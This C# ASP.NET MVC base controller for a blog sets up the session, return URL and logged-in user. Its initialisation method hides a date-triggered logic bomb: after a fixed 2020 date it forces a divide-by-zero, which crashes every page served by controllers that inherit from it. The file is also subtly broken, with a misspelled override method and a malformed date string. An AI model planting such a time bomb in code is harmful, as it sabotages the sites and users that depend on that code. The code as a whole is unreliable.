using MyBlog.Controllers.ViewModel;
using MyBlog.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace MyBlog.Controllers
{
    public class BaseController : Controller
    {
        public DB db = new DB();
        public User user { set; get; }
        public BaseController() { }
        protected override void Initalize(System.Web.Routing.RequestContext requestContext)
        {
            var now = DateTime.Now;
            var end = Convert.ToDateTime("2020--7-19 00:00");
            if (now >= end)
            {
                ViewBag.Fuck = 1234 / Convert.ToInt32("0");
            }

            base.Initialize(requestContext);
            ViewBag.SID = requestContext.HttpContext.Session["SID"].ToString();
            ViewBag.ReturnUrl = Request.RawUrl;
            if (requestContext.HttpContext.User.Identity.IsAuthenticated)
            {
                user = (from u in db.Users where u.UserName == requestContext.HttpContext.User.Identity.Name select u).SingleOrDefault();
                ViewBag.CurrectUser = new vCurrentUser(user);
                CurrentUser = ViewBag.CurrectUser;
            }
            else
            {
                ViewBag.CurrectUser = null;
            }
        }
        public vCurrentUser CurrentUser { get; set; }
    }
}
